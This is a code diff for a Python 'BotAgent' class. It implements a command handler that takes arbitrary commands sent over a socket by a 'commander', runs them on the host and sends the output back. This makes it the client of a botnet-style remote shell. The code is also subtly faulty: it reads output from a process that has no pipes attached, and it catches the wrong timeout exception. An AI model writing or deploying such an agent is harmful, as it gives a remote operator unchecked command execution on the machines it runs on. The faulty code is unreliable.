@@ -1,5 +1,7 @@
 import os
+import subprocess
 import uuid
+import shlex
 from subprocess import Popen
 import json
 from pathlib import Path
@@ -132,11 +134,32 @@ class BotAgent:
             except Exception as err:
                 print("Unexpected error on bot-agent {} when reading input stream from commander, error: {}".
                       format(self.hostname, err))
+                self.__self_identify()
             if data:
-                self.__process_command(data)
+                self.__process_command(data.decode("utf-8"))
 
     def __process_command(self, data):
-        pass
+        p = Popen(shlex.split(data))
+        try:
+            out, err = p.communicate(timeout=15)
+        except TimeoutError:
+            p.kill()
+            out, err = p.communicate()
+        if out and err:
+            response = "Output: {}, Error: {}".format(out, err)
+        elif out:
+            response = out
+        elif err:
+            response = err
+        else:
+            response = "Empty response from bot-agent {} for command {}".format(self.hostname, data)
+        try:
+            print("Sending {} from bot-agent {} to commander".format(response.encode("utf-8"), self.hostname))
+            self.sock.sendall(response.encode("utf-8"))
+            self.last_online = time.time()
+        except Exception as err:
+            print("Unexpected exception for bot-agent {} when replying to command {}: {}".format(self.hostname, data, err))
+            self.__self_identify()
 
     def __keep_alive(self):
         try:
